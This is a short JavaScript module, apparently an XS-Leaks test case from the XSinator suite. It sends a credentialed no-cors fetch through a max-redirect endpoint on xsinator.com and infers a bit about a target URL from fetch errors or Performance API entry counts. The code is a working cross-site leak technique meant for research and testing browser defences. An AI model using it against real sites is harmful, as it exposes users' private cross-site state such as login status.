// setup
let attackerUrl = "https://xsinator.com/testcases/files/maxredirect.php"


const leak = async (url) => {
    let pl = performance.getEntries().length
    return fetch(`${attackerUrl}?n=19&url=${encodeURI(url)}`, {
        credentials: "include",
        mode: "no-cors"
    })
    .then(async(e) => {
        // safari will not throw but we can check the performance api
        await sleep(500)
        console.log(`${pl} === ${performance.getEntries().length}`)
        if(pl === performance.getEntries().length && performance.getEntries().length !== 0) {
            return 1
        }
        return 0
    })
    .catch((e) => {
        return 1
    })

}

const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}

export { leak }